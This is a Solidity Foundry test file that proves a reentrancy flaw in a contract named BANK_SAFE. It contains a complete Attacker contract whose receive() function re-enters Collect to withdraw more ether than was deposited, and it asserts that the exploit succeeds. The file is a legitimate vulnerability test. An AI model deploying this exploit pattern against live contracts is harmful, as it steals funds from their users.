
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BANK_SAFE} from "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {
    BANK_SAFE public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new BANK_SAFE();

        // Configure BANK_SAFE
        _contractUnderTest.SetMinSum(1 wei);
        _contractUnderTest.SetLogFile(address(new LogFile()));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal < type(uint128).max / 4);

        vm.deal(address(_contractUnderTest), attackVal * 4);
        vm.deal(address(_attacker), attackVal * 4);
        vm.deal(address(this), attackVal * 4);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    BANK_SAFE public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = BANK_SAFE(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into BANK_SAFE via receive() / Deposit()
        // Send exactly val so victim.balances(address(this)) == val
        (bool ok, ) = address(victim).call{value: val}("");
        require(ok, "initial deposit failed");
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        // Trigger vulnerable Collect; this will call our receive()
        victim.Collect(val);

        // After reentrancy, we should have received more than initialSnapshot
        if (address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter before victim updates balances[msg.sender]
            victim.Collect(storedAttackVal);
        }
    }
}

contract LogFile {
    struct Message {
        address Sender;
        string Data;
        uint256 Val;
        uint256 Time;
    }

    Message[] public History;
    Message LastMsg;

    function AddMessage(address _adr, uint256 _val, string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
